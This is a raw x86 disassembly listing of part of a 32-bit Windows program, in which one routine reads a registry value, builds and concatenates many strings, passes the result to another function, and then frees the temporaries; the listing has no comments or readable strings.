  4071b9:	8b c8                	mov    %eax,%ecx
  4071bb:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4071c1:	50                   	push   %eax
  4071c2:	ff 15 58 d3 40 00    	call   *0x40d358
  4071c8:	59                   	pop    %ecx
  4071c9:	50                   	push   %eax
  4071ca:	e8 3d 55 00 00       	call   0x40c70c
  4071cf:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4071d2:	66 a3 7a 11 41 00    	mov    %ax,0x41117a
  4071d8:	e8 b2 a9 ff ff       	call   0x401b8f
  4071dd:	83 f8 02             	cmp    $0x2,%eax
  4071e0:	76 36                	jbe    0x407218
  4071e2:	6a 02                	push   $0x2
  4071e4:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4071e7:	e8 73 a9 ff ff       	call   0x401b5f
  4071ec:	be 58 11 41 00       	mov    $0x411158,%esi
  4071f1:	50                   	push   %eax
  4071f2:	8b ce                	mov    %esi,%ecx
  4071f4:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  4071fa:	8b ce                	mov    %esi,%ecx
  4071fc:	ff 15 c4 d2 40 00    	call   *0x40d2c4
  407202:	50                   	push   %eax
  407203:	8b ce                	mov    %esi,%ecx
  407205:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40720b:	50                   	push   %eax
  40720c:	b9 88 11 41 00       	mov    $0x411188,%ecx
  407211:	e8 82 ae ff ff       	call   0x402098
  407216:	eb 10                	jmp    0x407228
  407218:	68 a0 d4 40 00       	push   $0x40d4a0
  40721d:	b9 58 11 41 00       	mov    $0x411158,%ecx
  407222:	ff 15 78 d2 40 00    	call   *0x40d278
  407228:	83 ec 10             	sub    $0x10,%esp
  40722b:	be 78 11 41 00       	mov    $0x411178,%esi
  407230:	8b fc                	mov    %esp,%edi
  407232:	b9 70 1b 41 00       	mov    $0x411b70,%ecx
  407237:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407238:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407239:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40723a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40723b:	e8 c3 9e ff ff       	call   0x401103
  407240:	84 c0                	test   %al,%al
  407242:	0f 84 c1 07 00 00    	je     0x407a09
  407248:	6a 01                	push   $0x1
  40724a:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40724d:	5f                   	pop    %edi
  40724e:	57                   	push   %edi
  40724f:	e8 0b a9 ff ff       	call   0x401b5f
  407254:	83 ec 10             	sub    $0x10,%esp
  407257:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40725a:	8b f4                	mov    %esp,%esi
  40725c:	50                   	push   %eax
  40725d:	68 50 dd 40 00       	push   $0x40dd50
  407262:	6a 00                	push   $0x0
  407264:	e8 f6 a8 ff ff       	call   0x401b5f
  407269:	50                   	push   %eax
  40726a:	8d 85 b0 fc ff ff    	lea    -0x350(%ebp),%eax
  407270:	68 1c dd 40 00       	push   $0x40dd1c
  407275:	50                   	push   %eax
  407276:	e8 49 54 00 00       	call   0x40c6c4
  40727b:	83 c4 0c             	add    $0xc,%esp
  40727e:	50                   	push   %eax
  40727f:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  407285:	50                   	push   %eax
  407286:	e8 15 54 00 00       	call   0x40c6a0
  40728b:	83 c4 0c             	add    $0xc,%esp
  40728e:	50                   	push   %eax
  40728f:	56                   	push   %esi
  407290:	e8 23 54 00 00       	call   0x40c6b8
  407295:	51                   	push   %ecx
  407296:	8d 45 ee             	lea    -0x12(%ebp),%eax
  407299:	8b cc                	mov    %esp,%ecx
  40729b:	be 18 d5 40 00       	mov    $0x40d518,%esi
  4072a0:	50                   	push   %eax
  4072a1:	56                   	push   %esi
  4072a2:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  4072a8:	e8 43 39 00 00       	call   0x40abf0
  4072ad:	83 c4 20             	add    $0x20,%esp
  4072b0:	8d 8d 30 ff ff ff    	lea    -0xd0(%ebp),%ecx
  4072b6:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4072bc:	8d 8d b0 fc ff ff    	lea    -0x350(%ebp),%ecx
  4072c2:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4072c8:	80 65 90 00          	andb   $0x0,-0x70(%ebp)
  4072cc:	89 7d f4             	mov    %edi,-0xc(%ebp)
  4072cf:	33 c0                	xor    %eax,%eax
  4072d1:	8d 7d 91             	lea    -0x6f(%ebp),%edi
  4072d4:	ab                   	stos   %eax,%es:(%edi)
  4072d5:	ab                   	stos   %eax,%es:(%edi)
  4072d6:	ab                   	stos   %eax,%es:(%edi)
  4072d7:	ab                   	stos   %eax,%es:(%edi)
  4072d8:	ab                   	stos   %eax,%es:(%edi)
  4072d9:	e8 1b 3b 00 00       	call   0x40adf9
  4072de:	52                   	push   %edx
  4072df:	50                   	push   %eax
  4072e0:	8d 45 90             	lea    -0x70(%ebp),%eax
  4072e3:	68 14 dd 40 00       	push   $0x40dd14
  4072e8:	50                   	push   %eax
  4072e9:	ff 15 38 d3 40 00    	call   *0x40d338
  4072ef:	83 c4 10             	add    $0x10,%esp
  4072f2:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4072f5:	bf b8 d8 40 00       	mov    $0x40d8b8,%edi
  4072fa:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  407300:	50                   	push   %eax
  407301:	57                   	push   %edi
  407302:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  407308:	8d 45 ea             	lea    -0x16(%ebp),%eax
  40730b:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  40730e:	50                   	push   %eax
  40730f:	57                   	push   %edi
  407310:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  407316:	8d 45 a8             	lea    -0x58(%ebp),%eax
  407319:	6a 0a                	push   $0xa
  40731b:	50                   	push   %eax
  40731c:	ff 35 2c 11 41 00    	push   0x41112c
  407322:	ff 15 88 d3 40 00    	call   *0x40d388
  407328:	83 c4 0c             	add    $0xc,%esp
  40732b:	b9 20 1a 41 00       	mov    $0x411a20,%ecx
  407330:	6a 01                	push   $0x1
  407332:	e8 28 a8 ff ff       	call   0x401b5f
  407337:	50                   	push   %eax
  407338:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40733b:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  407341:	bf 30 1a 41 00       	mov    $0x411a30,%edi
  407346:	8b cf                	mov    %edi,%ecx
  407348:	ff 15 b8 d2 40 00    	call   *0x40d2b8
  40734e:	50                   	push   %eax
  40734f:	8b cf                	mov    %edi,%ecx
  407351:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  407357:	50                   	push   %eax
  407358:	8d 85 08 f8 ff ff    	lea    -0x7f8(%ebp),%eax
  40735e:	68 04 01 00 00       	push   $0x104
  407363:	50                   	push   %eax
  407364:	68 0c dd 40 00       	push   $0x40dd0c
  407369:	b9 c8 17 41 00       	mov    $0x4117c8,%ecx
  40736e:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  407374:	50                   	push   %eax
  407375:	68 01 00 00 80       	push   $0x80000001
  40737a:	e8 98 eb ff ff       	call   0x405f17
  40737f:	83 c4 1c             	add    $0x1c,%esp
  407382:	84 c0                	test   %al,%al
  407384:	74 10                	je     0x407396
  407386:	8d 85 08 f8 ff ff    	lea    -0x7f8(%ebp),%eax
  40738c:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40738f:	50                   	push   %eax
  407390:	ff 15 78 d2 40 00    	call   *0x40d278
  407396:	a1 d0 1a 41 00       	mov    0x411ad0,%eax
  40739b:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  40739f:	85 c0                	test   %eax,%eax
  4073a1:	74 05                	je     0x4073a8
  4073a3:	ff d0                	call   *%eax
  4073a5:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4073a8:	8d 45 eb             	lea    -0x15(%ebp),%eax
  4073ab:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  4073b1:	50                   	push   %eax
  4073b2:	68 ec 17 41 00       	push   $0x4117ec
  4073b7:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  4073bd:	83 ec 10             	sub    $0x10,%esp
  4073c0:	8d 85 10 ff ff ff    	lea    -0xf0(%ebp),%eax
  4073c6:	8b fc                	mov    %esp,%edi
  4073c8:	50                   	push   %eax
  4073c9:	53                   	push   %ebx
  4073ca:	8d 85 40 fc ff ff    	lea    -0x3c0(%ebp),%eax
  4073d0:	68 b0 17 41 00       	push   $0x4117b0
  4073d5:	50                   	push   %eax
  4073d6:	e8 f3 3e 00 00       	call   0x40b2ce
  4073db:	59                   	pop    %ecx
  4073dc:	59                   	pop    %ecx
  4073dd:	50                   	push   %eax
  4073de:	53                   	push   %ebx
  4073df:	0f b7 45 f0          	movzwl -0x10(%ebp),%eax
  4073e3:	50                   	push   %eax
  4073e4:	8d 85 60 fc ff ff    	lea    -0x3a0(%ebp),%eax
  4073ea:	50                   	push   %eax
  4073eb:	e8 a1 3d 00 00       	call   0x40b191
  4073f0:	59                   	pop    %ecx
  4073f1:	59                   	pop    %ecx
  4073f2:	50                   	push   %eax
  4073f3:	53                   	push   %ebx
  4073f4:	68 58 1a 41 00       	push   $0x411a58
  4073f9:	53                   	push   %ebx
  4073fa:	6a 00                	push   $0x0
  4073fc:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4073ff:	e8 5b a7 ff ff       	call   0x401b5f
  407404:	50                   	push   %eax
  407405:	8d 45 a8             	lea    -0x58(%ebp),%eax
  407408:	53                   	push   %ebx
  407409:	50                   	push   %eax
  40740a:	53                   	push   %ebx
  40740b:	ff 15 bc d0 40 00    	call   *0x40d0bc
  407411:	50                   	push   %eax
  407412:	8d 85 80 fc ff ff    	lea    -0x380(%ebp),%eax
  407418:	50                   	push   %eax
  407419:	e8 73 3d 00 00       	call   0x40b191
  40741e:	59                   	pop    %ecx
  40741f:	59                   	pop    %ecx
  407420:	50                   	push   %eax
  407421:	53                   	push   %ebx
  407422:	e8 ed 3c 00 00       	call   0x40b114
  407427:	50                   	push   %eax
  407428:	8d 85 a0 fc ff ff    	lea    -0x360(%ebp),%eax
  40742e:	50                   	push   %eax
  40742f:	e8 5d 3d 00 00       	call   0x40b191
  407434:	59                   	pop    %ecx
  407435:	59                   	pop    %ecx
  407436:	50                   	push   %eax
  407437:	a0 28 11 41 00       	mov    0x411128,%al
  40743c:	53                   	push   %ebx
  40743d:	50                   	push   %eax
  40743e:	8d 85 c0 fc ff ff    	lea    -0x340(%ebp),%eax
  407444:	53                   	push   %ebx
  407445:	50                   	push   %eax
  407446:	e8 8e 3c 00 00       	call   0x40b0d9
  40744b:	50                   	push   %eax
  40744c:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
  407452:	50                   	push   %eax
  407453:	e8 76 3e 00 00       	call   0x40b2ce
  407458:	83 c4 0c             	add    $0xc,%esp
  40745b:	50                   	push   %eax
  40745c:	8d 45 80             	lea    -0x80(%ebp),%eax
  40745f:	53                   	push   %ebx
  407460:	50                   	push   %eax
  407461:	8d 85 00 fd ff ff    	lea    -0x300(%ebp),%eax
  407467:	50                   	push   %eax
  407468:	e8 61 3e 00 00       	call   0x40b2ce
  40746d:	59                   	pop    %ecx
  40746e:	59                   	pop    %ecx
  40746f:	50                   	push   %eax
  407470:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  407476:	53                   	push   %ebx
  407477:	50                   	push   %eax
  407478:	8d 85 20 fd ff ff    	lea    -0x2e0(%ebp),%eax
  40747e:	50                   	push   %eax
  40747f:	e8 4a 3e 00 00       	call   0x40b2ce
  407484:	59                   	pop    %ecx
  407485:	59                   	pop    %ecx
  407486:	50                   	push   %eax
  407487:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  40748d:	53                   	push   %ebx
  40748e:	50                   	push   %eax
  40748f:	8d 85 40 fd ff ff    	lea    -0x2c0(%ebp),%eax
  407495:	50                   	push   %eax
  407496:	e8 33 3e 00 00       	call   0x40b2ce
  40749b:	59                   	pop    %ecx
  40749c:	59                   	pop    %ecx
  40749d:	50                   	push   %eax
  40749e:	53                   	push   %ebx
  40749f:	68 f8 db 40 00       	push   $0x40dbf8
  4074a4:	8d 45 90             	lea    -0x70(%ebp),%eax
  4074a7:	53                   	push   %ebx
  4074a8:	50                   	push   %eax
  4074a9:	53                   	push   %ebx
  4074aa:	8d 85 60 fd ff ff    	lea    -0x2a0(%ebp),%eax
  4074b0:	68 a0 1c 41 00       	push   $0x411ca0
  4074b5:	50                   	push   %eax
  4074b6:	e8 13 3e 00 00       	call   0x40b2ce
  4074bb:	59                   	pop    %ecx
  4074bc:	59                   	pop    %ecx
  4074bd:	50                   	push   %eax
  4074be:	53                   	push   %ebx
  4074bf:	68 48 1a 41 00       	push   $0x411a48
  4074c4:	8d 85 80 fd ff ff    	lea    -0x280(%ebp),%eax
  4074ca:	53                   	push   %ebx
  4074cb:	50                   	push   %eax
  4074cc:	e8 a0 e1 ff ff       	call   0x405671
  4074d1:	59                   	pop    %ecx
  4074d2:	50                   	push   %eax
  4074d3:	53                   	push   %ebx
  4074d4:	8d 85 a0 fd ff ff    	lea    -0x260(%ebp),%eax
  4074da:	68 68 1a 41 00       	push   $0x411a68
  4074df:	50                   	push   %eax
  4074e0:	e8 e9 3d 00 00       	call   0x40b2ce
  4074e5:	59                   	pop    %ecx
  4074e6:	59                   	pop    %ecx
  4074e7:	50                   	push   %eax
  4074e8:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4074eb:	53                   	push   %ebx
  4074ec:	50                   	push   %eax
  4074ed:	8d 85 c0 fd ff ff    	lea    -0x240(%ebp),%eax
  4074f3:	50                   	push   %eax
  4074f4:	e8 bf 51 00 00       	call   0x40c6b8
  4074f9:	83 c4 0c             	add    $0xc,%esp
  4074fc:	50                   	push   %eax
  4074fd:	8d 85 e0 fd ff ff    	lea    -0x220(%ebp),%eax
  407503:	50                   	push   %eax
  407504:	e8 af 51 00 00       	call   0x40c6b8
  407509:	83 c4 0c             	add    $0xc,%esp
  40750c:	50                   	push   %eax
  40750d:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
  407513:	50                   	push   %eax
  407514:	e8 9f 51 00 00       	call   0x40c6b8
  407519:	83 c4 0c             	add    $0xc,%esp
  40751c:	50                   	push   %eax
  40751d:	8d 85 20 fe ff ff    	lea    -0x1e0(%ebp),%eax
  407523:	50                   	push   %eax
  407524:	e8 8f 51 00 00       	call   0x40c6b8
  407529:	83 c4 0c             	add    $0xc,%esp
  40752c:	50                   	push   %eax
  40752d:	8d 85 40 fe ff ff    	lea    -0x1c0(%ebp),%eax
  407533:	50                   	push   %eax
  407534:	e8 7f 51 00 00       	call   0x40c6b8
  407539:	83 c4 0c             	add    $0xc,%esp
  40753c:	50                   	push   %eax
  40753d:	8d 85 60 fe ff ff    	lea    -0x1a0(%ebp),%eax
  407543:	50                   	push   %eax
  407544:	e8 6f 51 00 00       	call   0x40c6b8
  407549:	83 c4 0c             	add    $0xc,%esp
  40754c:	50                   	push   %eax
  40754d:	8d 85 80 fe ff ff    	lea    -0x180(%ebp),%eax
  407553:	50                   	push   %eax
  407554:	e8 5f 51 00 00       	call   0x40c6b8
  407559:	83 c4 0c             	add    $0xc,%esp
  40755c:	50                   	push   %eax
  40755d:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  407563:	50                   	push   %eax
  407564:	e8 4f 51 00 00       	call   0x40c6b8
  407569:	83 c4 0c             	add    $0xc,%esp
  40756c:	50                   	push   %eax
  40756d:	8d 85 c0 fe ff ff    	lea    -0x140(%ebp),%eax
  407573:	50                   	push   %eax
  407574:	e8 3f 51 00 00       	call   0x40c6b8
  407579:	83 c4 0c             	add    $0xc,%esp
  40757c:	50                   	push   %eax
  40757d:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  407583:	50                   	push   %eax
  407584:	e8 17 51 00 00       	call   0x40c6a0
  407589:	83 c4 0c             	add    $0xc,%esp
  40758c:	50                   	push   %eax
  40758d:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  407593:	50                   	push   %eax
  407594:	e8 1f 51 00 00       	call   0x40c6b8
  407599:	83 c4 0c             	add    $0xc,%esp
  40759c:	50                   	push   %eax
  40759d:	8d 85 20 ff ff ff    	lea    -0xe0(%ebp),%eax
  4075a3:	50                   	push   %eax
  4075a4:	e8 f7 50 00 00       	call   0x40c6a0
  4075a9:	83 c4 0c             	add    $0xc,%esp
  4075ac:	50                   	push   %eax
  4075ad:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
  4075b3:	50                   	push   %eax
  4075b4:	e8 ff 50 00 00       	call   0x40c6b8
  4075b9:	83 c4 0c             	add    $0xc,%esp
  4075bc:	50                   	push   %eax
  4075bd:	8d 85 90 fd ff ff    	lea    -0x270(%ebp),%eax
  4075c3:	50                   	push   %eax
  4075c4:	e8 ef 50 00 00       	call   0x40c6b8
  4075c9:	83 c4 0c             	add    $0xc,%esp
  4075cc:	50                   	push   %eax
  4075cd:	8d 85 50 fc ff ff    	lea    -0x3b0(%ebp),%eax
  4075d3:	50                   	push   %eax
  4075d4:	e8 df 50 00 00       	call   0x40c6b8
  4075d9:	83 c4 0c             	add    $0xc,%esp
  4075dc:	50                   	push   %eax
  4075dd:	8d 85 b0 fd ff ff    	lea    -0x250(%ebp),%eax
  4075e3:	50                   	push   %eax
  4075e4:	e8 cf 50 00 00       	call   0x40c6b8
  4075e9:	83 c4 0c             	add    $0xc,%esp
  4075ec:	50                   	push   %eax
  4075ed:	8d 85 d0 fc ff ff    	lea    -0x330(%ebp),%eax
  4075f3:	50                   	push   %eax
  4075f4:	e8 bf 50 00 00       	call   0x40c6b8
  4075f9:	83 c4 0c             	add    $0xc,%esp
  4075fc:	50                   	push   %eax
  4075fd:	8d 85 d0 fd ff ff    	lea    -0x230(%ebp),%eax
  407603:	50                   	push   %eax
  407604:	e8 af 50 00 00       	call   0x40c6b8
  407609:	83 c4 0c             	add    $0xc,%esp
  40760c:	50                   	push   %eax
  40760d:	8d 85 20 fc ff ff    	lea    -0x3e0(%ebp),%eax
  407613:	50                   	push   %eax
  407614:	e8 9f 50 00 00       	call   0x40c6b8
  407619:	83 c4 0c             	add    $0xc,%esp
  40761c:	50                   	push   %eax
  40761d:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  407623:	50                   	push   %eax
  407624:	e8 8f 50 00 00       	call   0x40c6b8
  407629:	83 c4 0c             	add    $0xc,%esp
  40762c:	50                   	push   %eax
  40762d:	8d 85 f0 fc ff ff    	lea    -0x310(%ebp),%eax
  407633:	50                   	push   %eax
  407634:	e8 7f 50 00 00       	call   0x40c6b8
  407639:	83 c4 0c             	add    $0xc,%esp
  40763c:	50                   	push   %eax
  40763d:	8d 85 10 fe ff ff    	lea    -0x1f0(%ebp),%eax
  407643:	50                   	push   %eax
  407644:	e8 75 50 00 00       	call   0x40c6be
  407649:	83 c4 0c             	add    $0xc,%esp
  40764c:	50                   	push   %eax
  40764d:	8d 85 70 fc ff ff    	lea    -0x390(%ebp),%eax
  407653:	50                   	push   %eax
  407654:	e8 5f 50 00 00       	call   0x40c6b8
  407659:	83 c4 0c             	add    $0xc,%esp
  40765c:	50                   	push   %eax
  40765d:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
  407663:	50                   	push   %eax
  407664:	e8 4f 50 00 00       	call   0x40c6b8
  407669:	83 c4 0c             	add    $0xc,%esp
  40766c:	50                   	push   %eax
  40766d:	8d 85 10 fd ff ff    	lea    -0x2f0(%ebp),%eax
  407673:	50                   	push   %eax
  407674:	e8 3f 50 00 00       	call   0x40c6b8
  407679:	83 c4 0c             	add    $0xc,%esp
  40767c:	50                   	push   %eax
  40767d:	8d 85 50 fe ff ff    	lea    -0x1b0(%ebp),%eax
  407683:	50                   	push   %eax
  407684:	e8 2f 50 00 00       	call   0x40c6b8
  407689:	83 c4 0c             	add    $0xc,%esp
  40768c:	50                   	push   %eax
  40768d:	8d 85 30 fc ff ff    	lea    -0x3d0(%ebp),%eax
  407693:	50                   	push   %eax
  407694:	e8 1f 50 00 00       	call   0x40c6b8
  407699:	83 c4 0c             	add    $0xc,%esp
  40769c:	50                   	push   %eax
  40769d:	8d 85 70 fe ff ff    	lea    -0x190(%ebp),%eax
  4076a3:	50                   	push   %eax
  4076a4:	e8 f7 4f 00 00       	call   0x40c6a0
  4076a9:	83 c4 0c             	add    $0xc,%esp
  4076ac:	50                   	push   %eax
  4076ad:	8d 85 30 fd ff ff    	lea    -0x2d0(%ebp),%eax
  4076b3:	50                   	push   %eax
  4076b4:	e8 ff 4f 00 00       	call   0x40c6b8
  4076b9:	83 c4 0c             	add    $0xc,%esp
  4076bc:	50                   	push   %eax
  4076bd:	8d 85 90 fe ff ff    	lea    -0x170(%ebp),%eax
  4076c3:	50                   	push   %eax
  4076c4:	e8 ef 4f 00 00       	call   0x40c6b8
  4076c9:	83 c4 0c             	add    $0xc,%esp
  4076cc:	50                   	push   %eax
  4076cd:	8d 85 90 fc ff ff    	lea    -0x370(%ebp),%eax
  4076d3:	50                   	push   %eax
  4076d4:	e8 df 4f 00 00       	call   0x40c6b8
  4076d9:	83 c4 0c             	add    $0xc,%esp
  4076dc:	50                   	push   %eax
  4076dd:	8d 85 b0 fe ff ff    	lea    -0x150(%ebp),%eax
  4076e3:	50                   	push   %eax
  4076e4:	e8 cf 4f 00 00       	call   0x40c6b8
  4076e9:	83 c4 0c             	add    $0xc,%esp
  4076ec:	50                   	push   %eax
  4076ed:	8d 85 50 fd ff ff    	lea    -0x2b0(%ebp),%eax
  4076f3:	50                   	push   %eax
  4076f4:	e8 bf 4f 00 00       	call   0x40c6b8
  4076f9:	83 c4 0c             	add    $0xc,%esp
  4076fc:	50                   	push   %eax
  4076fd:	8d 85 d0 fe ff ff    	lea    -0x130(%ebp),%eax
  407703:	50                   	push   %eax
  407704:	e8 af 4f 00 00       	call   0x40c6b8
  407709:	83 c4 0c             	add    $0xc,%esp
  40770c:	50                   	push   %eax
  40770d:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
  407713:	50                   	push   %eax
  407714:	e8 9f 4f 00 00       	call   0x40c6b8
  407719:	83 c4 0c             	add    $0xc,%esp
  40771c:	50                   	push   %eax
  40771d:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
  407723:	50                   	push   %eax
  407724:	e8 8f 4f 00 00       	call   0x40c6b8
  407729:	83 c4 0c             	add    $0xc,%esp
  40772c:	50                   	push   %eax
  40772d:	8d 85 70 fd ff ff    	lea    -0x290(%ebp),%eax
  407733:	50                   	push   %eax
  407734:	e8 7f 4f 00 00       	call   0x40c6b8
  407739:	83 c4 0c             	add    $0xc,%esp
  40773c:	50                   	push   %eax
  40773d:	57                   	push   %edi
  40773e:	e8 75 4f 00 00       	call   0x40c6b8
  407743:	83 c4 0c             	add    $0xc,%esp
  407746:	bf 70 1b 41 00       	mov    $0x411b70,%edi
  40774b:	8b cf                	mov    %edi,%ecx
  40774d:	6a 4b                	push   $0x4b
  40774f:	e8 d6 99 ff ff       	call   0x40112a
  407754:	8d 8d 70 fd ff ff    	lea    -0x290(%ebp),%ecx
  40775a:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407760:	8d 8d f0 fe ff ff    	lea    -0x110(%ebp),%ecx
  407766:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40776c:	8d 8d 00 fc ff ff    	lea    -0x400(%ebp),%ecx
  407772:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407778:	8d 8d d0 fe ff ff    	lea    -0x130(%ebp),%ecx
  40777e:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407784:	8d 8d 50 fd ff ff    	lea    -0x2b0(%ebp),%ecx
  40778a:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407790:	8d 8d b0 fe ff ff    	lea    -0x150(%ebp),%ecx
  407796:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40779c:	8d 8d 90 fc ff ff    	lea    -0x370(%ebp),%ecx
  4077a2:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4077a8:	8d 8d 90 fe ff ff    	lea    -0x170(%ebp),%ecx
  4077ae:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4077b4:	8d 8d 30 fd ff ff    	lea    -0x2d0(%ebp),%ecx
  4077ba:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4077c0:	8d 8d 70 fe ff ff    	lea    -0x190(%ebp),%ecx
  4077c6:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4077cc:	8d 8d 30 fc ff ff    	lea    -0x3d0(%ebp),%ecx
  4077d2:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4077d8:	8d 8d 50 fe ff ff    	lea    -0x1b0(%ebp),%ecx
  4077de:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4077e4:	8d 8d 10 fd ff ff    	lea    -0x2f0(%ebp),%ecx
  4077ea:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4077f0:	8d 8d 50 ff ff ff    	lea    -0xb0(%ebp),%ecx
  4077f6:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4077fc:	8d 8d 70 fc ff ff    	lea    -0x390(%ebp),%ecx
  407802:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407808:	8d 8d 10 fe ff ff    	lea    -0x1f0(%ebp),%ecx
  40780e:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407814:	8d 8d f0 fc ff ff    	lea    -0x310(%ebp),%ecx
  40781a:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407820:	8d 8d f0 fd ff ff    	lea    -0x210(%ebp),%ecx
  407826:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40782c:	8d 8d 20 fc ff ff    	lea    -0x3e0(%ebp),%ecx
  407832:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407838:	8d 8d d0 fd ff ff    	lea    -0x230(%ebp),%ecx
  40783e:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407844:	8d 8d d0 fc ff ff    	lea    -0x330(%ebp),%ecx
  40784a:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407850:	8d 8d b0 fd ff ff    	lea    -0x250(%ebp),%ecx
  407856:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40785c:	8d 8d 50 fc ff ff    	lea    -0x3b0(%ebp),%ecx
  407862:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407868:	8d 8d 90 fd ff ff    	lea    -0x270(%ebp),%ecx
  40786e:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407874:	8d 8d 40 ff ff ff    	lea    -0xc0(%ebp),%ecx
  40787a:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407880:	8d 8d 20 ff ff ff    	lea    -0xe0(%ebp),%ecx
  407886:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40788c:	8d 8d 00 ff ff ff    	lea    -0x100(%ebp),%ecx
  407892:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407898:	8d 8d e0 fe ff ff    	lea    -0x120(%ebp),%ecx
  40789e:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4078a4:	8d 8d c0 fe ff ff    	lea    -0x140(%ebp),%ecx
  4078aa:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4078b0:	8d 8d a0 fe ff ff    	lea    -0x160(%ebp),%ecx
  4078b6:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4078bc:	8d 8d 80 fe ff ff    	lea    -0x180(%ebp),%ecx
  4078c2:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4078c8:	8d 8d 60 fe ff ff    	lea    -0x1a0(%ebp),%ecx
  4078ce:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4078d4:	8d 8d 40 fe ff ff    	lea    -0x1c0(%ebp),%ecx
  4078da:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4078e0:	8d 8d 20 fe ff ff    	lea    -0x1e0(%ebp),%ecx
  4078e6:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4078ec:	8d 8d 00 fe ff ff    	lea    -0x200(%ebp),%ecx
  4078f2:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4078f8:	8d 8d e0 fd ff ff    	lea    -0x220(%ebp),%ecx
  4078fe:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407904:	8d 8d c0 fd ff ff    	lea    -0x240(%ebp),%ecx
  40790a:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407910:	8d 8d a0 fd ff ff    	lea    -0x260(%ebp),%ecx
  407916:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40791c:	8d 8d 80 fd ff ff    	lea    -0x280(%ebp),%ecx
  407922:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407928:	8d 8d 60 fd ff ff    	lea    -0x2a0(%ebp),%ecx
  40792e:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407934:	8d 8d 40 fd ff ff    	lea    -0x2c0(%ebp),%ecx
  40793a:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407940:	8d 8d 20 fd ff ff    	lea    -0x2e0(%ebp),%ecx
  407946:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40794c:	8d 8d 00 fd ff ff    	lea    -0x300(%ebp),%ecx
  407952:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407958:	8d 8d e0 fc ff ff    	lea    -0x320(%ebp),%ecx
  40795e:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407964:	8d 8d c0 fc ff ff    	lea    -0x340(%ebp),%ecx
